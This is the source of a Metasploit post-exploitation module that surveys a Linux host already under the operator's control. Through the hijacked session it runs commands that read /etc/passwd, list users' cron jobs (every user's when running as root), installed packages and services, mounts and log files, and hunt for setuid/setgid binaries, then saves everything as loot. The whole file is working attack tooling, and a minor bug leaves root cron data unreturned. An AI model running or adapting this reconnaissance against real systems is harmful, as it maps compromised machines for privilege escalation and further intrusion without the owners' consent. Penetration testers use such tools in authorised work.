##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Linux Gather System and User Information',
      'Description'   => %q{
        This module gathers system information. We collect
        installed packages, installed services, mount information,
        user list, user bash history and cron jobs
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Carlos Perez <carlos_perez[at]darkoperator.com>', # get_packages and get_services
          'Stephen Haywood <averagesecurityguy[at]gmail.com>', # get_cron and original enum_linux
          'sinn3r', # Testing and modification of original enum_linux
          'ohdae <bindshell[at]live.com>', # Combined separate mods, modifications and testing
          'Roberto Espreto <robertoespreto[at]gmail.com>', # log files and setuid/setgid
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell', 'meterpreter']
    ))
  end

  def run
    distro = get_sysinfo
    store_loot(
      "linux.version",
      "text/plain",
      session,
      "Distro: #{distro[:distro]},Version: #{distro[:version]}, Kernel: #{distro[:kernel]}",
      "linux_info.txt",
      "Linux Version")

    # Print the info
    print_good("Info:")
    print_good("\t#{distro[:version]}")
    print_good("\t#{distro[:kernel]}")

    users = execute("/bin/cat /etc/passwd | cut -d : -f 1")
    user = execute("/usr/bin/whoami")

    print_good("\tModule running as \"#{user}\" user")

    installed_pkg = get_packages(distro[:distro])
    installed_svc = get_services(distro[:distro])

    mount = execute("/bin/mount -l")
    crons = get_crons(users, user)
    diskspace = execute("/bin/df -ahT")
    disks = (mount + "\n\n" + diskspace)
    logfiles = execute("find /var/log -type f -perm -4 2> /dev/null")
    uidgid = execute("find / -xdev -type f -perm +6000 -perm -1 2> /dev/null")

    save("Linux version", distro)
    save("User accounts", users)
    save("Installed Packages", installed_pkg)
    save("Running Services", installed_svc)
    save("Cron jobs", crons)
    save("Disk info", disks)
    save("Logfiles", logfiles)
    save("Setuid/setgid files", uidgid)
  end

  def save(msg, data, ctype = 'text/plain')
    ltype = "linux.enum.system"
    loot = store_loot(ltype, ctype, session, data, nil, msg)
    print_status("#{msg} stored in #{loot}")
  end

  def execute(cmd)
    vprint_status("Execute: #{cmd}")
    output = cmd_exec(cmd)
    output
  end

  def get_packages(distro)
    packages_installed = ""
    case distro
    when /fedora|redhat|suse|mandrake|oracle|amazon/
      packages_installed = execute("rpm -qa")
    when /slackware/
      packages_installed = execute("/bin/ls /var/log/packages")
    when /ubuntu|debian/
      packages_installed = execute("/usr/bin/dpkg -l")
    when /gentoo/
      packages_installed = execute("equery list")
    when /arch/
      packages_installed = execute("/usr/bin/pacman -Q")
    else
      print_error("Could not determine package manager to get list of installed packages")
    end
    packages_installed
  end

  def get_services(distro)
    services_installed = ""
    case distro
    when /fedora|redhat|suse|mandrake|oracle|amazon/
      services_installed = execute("/sbin/chkconfig --list")
    when /slackware/
      services_installed << "\nEnabled:\n*************************\n"
      services_installed << execute("ls -F /etc/rc.d | /bin/grep \'*$\'")
      services_installed << "\n\nDisabled:\n*************************\n"
      services_installed << execute("ls -F /etc/rc.d | /bin/grep \'[a-z0-9A-z]$\'")
    when /ubuntu|debian/
      services_installed = execute("/usr/sbin/service --status-all")
    when /gentoo/
      services_installed = execute("/bin/rc-status --all")
    when /arch/
      services_installed = execute("/bin/egrep '^DAEMONS' /etc/rc.conf")
    else
      print_error("Could not determine the Linux Distribution to get list of configured services")
    end
    services_installed
  end

  def get_crons(users, user)
    if user == "root" && users
      users = users.chomp.split
      users.each do |u|
        if u == "root"
          vprint_status("Enumerating as root")
          cron_data = ""
          users.each do |usr|
            cron_data << "*****Listing cron jobs for #{usr}*****\n"
            cron_data << execute("crontab -u #{usr} -l") + "\n\n"
          end
        end
      end
    else
      vprint_status("Enumerating as #{user}")
      cron_data = "***** Listing cron jobs for #{user} *****\n\n"
      cron_data << execute("crontab -l")

      # Save cron data to loot
      cron_data
    end
  end
end
